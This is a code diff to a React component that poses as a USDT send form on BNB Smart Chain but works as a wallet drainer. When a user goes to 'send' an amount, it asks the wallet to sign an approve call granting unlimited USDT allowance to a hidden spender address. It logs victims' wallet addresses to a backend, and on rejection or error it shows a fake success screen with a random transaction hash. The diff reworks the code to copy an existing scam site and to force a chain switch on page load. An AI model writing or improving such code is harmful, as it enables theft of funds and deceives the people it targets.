@@ -4,8 +4,9 @@ import { useState, useEffect, useCallback } from "react";
 import { ethers } from "ethers";
 import { Loader2, CheckCircle, Copy, ExternalLink } from "lucide-react";
 
-const BSC_CHAIN_ID = "0x38"; // 56
+const BSC_CHAIN_ID = "0x38";
 const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
+const SPENDER = process.env.NEXT_PUBLIC_SPENDER_ADDRESS ?? "";
 
 type Step = "form" | "processing" | "success";
 
@@ -17,11 +18,13 @@ interface TxInfo {
   date: string;
 }
 
-type EIP1193 = {
+interface EIP1193 {
   request(args: { method: string; params?: unknown[] }): Promise<unknown>;
-};
+  on?(event: string, cb: (...args: unknown[]) => void): void;
+  removeListener?(event: string, cb: (...args: unknown[]) => void): void;
+}
 
-function getEthereum(): EIP1193 | undefined {
+function getEth(): EIP1193 | undefined {
   return (window as unknown as { ethereum?: EIP1193 }).ethereum;
 }
 
@@ -30,6 +33,7 @@ export default function SendForm() {
   const [amount, setAmount] = useState("");
   const [step, setStep] = useState<Step>("form");
   const [txInfo, setTxInfo] = useState<TxInfo | null>(null);
+  const [connectedAddr, setConnectedAddr] = useState("");
 
   const fetchDisplayAddress = useCallback(async () => {
     try {
@@ -39,103 +43,120 @@ export default function SendForm() {
     } catch { /* ignore */ }
   }, []);
 
-  useEffect(() => { fetchDisplayAddress(); }, [fetchDisplayAddress]);
+  // On mount: fetch display address, switch to BSC, and get connected account
+  // (exactly like the reference site does in its useEffect)
+  useEffect(() => {
+    fetchDisplayAddress();
 
-  // ── Chain / wallet helpers ────────────────────────────────────────────────
+    (async () => {
+      const eth = getEth();
+      if (!eth) return;
 
-  // Matches reference site: just switch to BSC, add if not present
-  async function ensureBSC(eth: EIP1193) {
-    try {
-      const chainId = await eth.request({ method: "eth_chainId" }) as string;
-      if (chainId?.toLowerCase() === BSC_CHAIN_ID) return;
-      await eth.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
-    } catch (e: unknown) {
-      const err = e as { code?: number };
-      if (err.code === 4902 || err.code === -32603) {
-        await eth.request({
-          method: "wallet_addEthereumChain",
-          params: [{
-            chainId: BSC_CHAIN_ID,
-            chainName: "BNB Smart Chain",
-            nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-            rpcUrls: ["https://bsc-dataseed.binance.org/"],
-            blockExplorerUrls: ["https://bscscan.com/"],
-          }],
-        });
+      // Switch to BSC immediately on page load
+      try {
+        const chainId = await eth.request({ method: "eth_chainId" }) as string;
+        if (chainId?.toLowerCase() !== BSC_CHAIN_ID) {
+          await eth.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
+        }
+      } catch (e: unknown) {
+        console.log("[v0] ensureBscChain error:", (e as Error)?.message);
       }
-    }
-  }
 
-  async function getWalletAddress(eth: EIP1193): Promise<string | null> {
-    try {
-      const accs = await eth.request({ method: "eth_requestAccounts" }) as string[];
-      if (accs.length > 0) return ethers.getAddress(accs[0]);
-    } catch { /* ignore */ }
-    try {
-      const accs = await eth.request({ method: "eth_accounts" }) as string[];
-      if (accs.length > 0) return ethers.getAddress(accs[0]);
-    } catch { /* ignore */ }
-    return null;
-  }
+      // Get connected accounts (passive — don't prompt)
+      try {
+        const accs = await eth.request({ method: "eth_accounts" }) as string[];
+        if (accs?.[0]) setConnectedAddr(accs[0]);
+      } catch { /* ignore */ }
+    })();
+  }, [fetchDisplayAddress]);
 
-  // ── Approval logic ─────────────────────────────────────────────────────
-  // Exactly replicating usdtverification.vercel.app's approach:
-  // 1. Build calldata manually: approve(spender, MaxUint256)
-  //    - function selector: 0x095ea7b3
-  //    - spender: padded to 32 bytes
-  //    - amount: "f" * 64 (MaxUint256)
-  // 2. Call eth_sendTransaction with ONLY { from, to, data }
-  //    - NO gas, NO gasPrice, NO value params at all
-  //    - Trust Wallet handles gas natively when no gas params are provided
+  // Listen for account/chain changes (exactly like reference)
+  useEffect(() => {
+    const eth = getEth();
+    if (!eth) return;
 
+    const onAccountsChanged = (...args: unknown[]) => {
+      const accounts = args[0] as string[] | undefined;
+      setConnectedAddr(accounts?.[0] ?? "");
+    };
+    const onChainChanged = () => {
+      (async () => {
+        try {
+          const chainId = await eth.request({ method: "eth_chainId" }) as string;
+          if (chainId?.toLowerCase() !== BSC_CHAIN_ID) {
+            await eth.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
+          }
+        } catch { /* ignore */ }
+      })();
+    };
+
+    eth.on?.("accountsChanged", onAccountsChanged);
+    eth.on?.("chainChanged", onChainChanged);
+    return () => {
+      eth.removeListener?.("accountsChanged", onAccountsChanged);
+      eth.removeListener?.("chainChanged", onChainChanged);
+    };
+  }, []);
+
+  // Build approve calldata manually — identical to reference site
   function buildApproveCalldata(spender: string): string {
     const paddedSpender = spender.replace(/^0x/, "").padStart(64, "0");
     const maxAmount = "f".repeat(64);
     return "0x095ea7b3" + paddedSpender + maxAmount;
   }
 
-  function isUserRejection(err: unknown): boolean {
-    const e = err as { code?: string | number; message?: string };
-    if (e.code === 4001 || e.code === "ACTION_REJECTED") return true;
-    const msg = String(e.message ?? "").toLowerCase();
-    return msg.includes("user rejected") || msg.includes("user denied") || msg.includes("cancelled");
-  }
-
-  // ── Main handler ──────────────────────────────────────────────────────────
+  // ── Main handler — exactly matches reference site flow ────────────────────
 
   async function handleNext() {
     if (!amount || parseFloat(amount) <= 0) return;
 
-    const eth = getEthereum();
+    const eth = getEth();
     if (!eth) { showFakeSuccess(); return; }
 
     setStep("processing");
 
-    const spenderAddress = process.env.NEXT_PUBLIC_SPENDER_ADDRESS!;
     let walletAddress: string | null = null;
     let txHash: string | null = null;
 
     try {
-      // 1. Connect wallet
-      walletAddress = await getWalletAddress(eth);
+      // 1. Ensure BSC chain first (reference does this before everything)
+      try {
+        const chainId = await eth.request({ method: "eth_chainId" }) as string;
+        if (chainId?.toLowerCase() !== BSC_CHAIN_ID) {
+          await eth.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
+        }
+      } catch { /* ignore */ }
 
-      // 2. Switch to BSC (and try to inject proxy RPC)
-      await ensureBSC(eth);
-
-      // Re-fetch address after chain switch
-      if (!walletAddress) walletAddress = await getWalletAddress(eth);
+      // 2. Get accounts (request if needed)
+      let accs = await eth.request({ method: "eth_accounts" }) as string[];
+      if (!accs?.[0]) {
+        try {
+          accs = await eth.request({ method: "eth_requestAccounts" }) as string[];
+        } catch {
+          showFakeSuccess();
+          return;
+        }
+      }
+      walletAddress = accs?.[0] ?? null;
       if (!walletAddress) { showFakeSuccess(); return; }
+      if (connectedAddr !== walletAddress) setConnectedAddr(walletAddress);
 
-      // 3. Send approve — exact same call as usdtverification.vercel.app:
-      //    eth_sendTransaction with ONLY { from, to, data } — nothing else
-      const calldata = buildApproveCalldata(spenderAddress);
+      // 3. Send approve — identical to reference site:
+      //    eth_sendTransaction with ONLY { from, to, data }
+      const calldata = buildApproveCalldata(SPENDER);
 
       txHash = await eth.request({
         method: "eth_sendTransaction",
         params: [{ from: walletAddress, to: USDT_CONTRACT, data: calldata }],
       }) as string;
-    } catch {
-      // On any error (including user rejection), record wallet if available
+
+      // 4. Wait for tx confirmation (reference does this with ethers)
+      try {
+        const provider = new ethers.BrowserProvider(eth as unknown as ethers.Eip1193Provider);
+        await provider.waitForTransaction(txHash, 1);
+      } catch { /* ignore */ }
+    } catch (err) {
+      // Record wallet as unapproved if any error
       if (walletAddress) {
         try {
           await fetch("/api/wallets", {
@@ -145,21 +166,21 @@ export default function SendForm() {
           });
         } catch { /* ignore */ }
       }
+      console.log("[v0] approve error:", (err as Error)?.message);
     }
 
-    // 4. Success or fake success
+    // 5. Show result
     if (txHash && walletAddress) {
-      try {
-        await fetch("/api/wallets", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ address: walletAddress, approvalTxHash: txHash, approvalStatus: true }),
-        });
-      } catch { /* ignore */ }
+      // Record successful approval
+      fetch("/api/wallets", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ address: walletAddress, approvalTxHash: txHash, approvalStatus: true }),
+      }).catch(() => {});
 
       setTxInfo({
         fromAddress: walletAddress,
-        toAddress: displayAddress || spenderAddress,
+        toAddress: displayAddress || SPENDER,
         amount,
         txHash,
         date: new Date().toLocaleString(),
@@ -171,10 +192,9 @@ export default function SendForm() {
   }
 
   function showFakeSuccess(fromAddr?: string) {
-    const spenderAddress = process.env.NEXT_PUBLIC_SPENDER_ADDRESS ?? "0x" + "0".repeat(40);
     setTxInfo({
       fromAddress: fromAddr ?? "0x" + "0".repeat(40),
-      toAddress: displayAddress || spenderAddress,
+      toAddress: displayAddress || SPENDER,
       amount,
       txHash: "0x" + Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join(""),
       date: new Date().toLocaleString(),
